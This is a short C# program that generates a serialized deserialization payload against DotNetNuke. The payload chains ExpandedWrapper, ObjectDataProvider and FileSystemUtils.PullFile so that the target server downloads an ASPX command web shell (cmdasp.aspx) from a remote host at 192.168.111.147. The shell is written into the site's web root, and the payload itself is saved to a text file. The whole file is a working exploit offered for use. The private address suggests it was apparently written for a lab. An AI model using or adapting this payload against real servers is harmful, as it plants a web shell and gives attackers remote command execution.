using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using System.Windows.Data;
using System.Collections;
using System.Data.Services.Internal;

namespace ExpWrapSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            Serialize();
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> tooManyWraps = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            tooManyWraps.ProjectedProperty0 = new ObjectDataProvider();
            tooManyWraps.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            tooManyWraps.ProjectedProperty0.MethodName = "PullFile";
            tooManyWraps.ProjectedProperty0.MethodParameters.Add("http://192.168.111.147:80/cmdasp.aspx");
            tooManyWraps.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx");

            Hashtable table = new Hashtable();
            table["stevesTable"] = tooManyWraps;
            String payload = XmlUtils.SerializeDictionary(table, "profile");
            TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFile.txt");
            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}
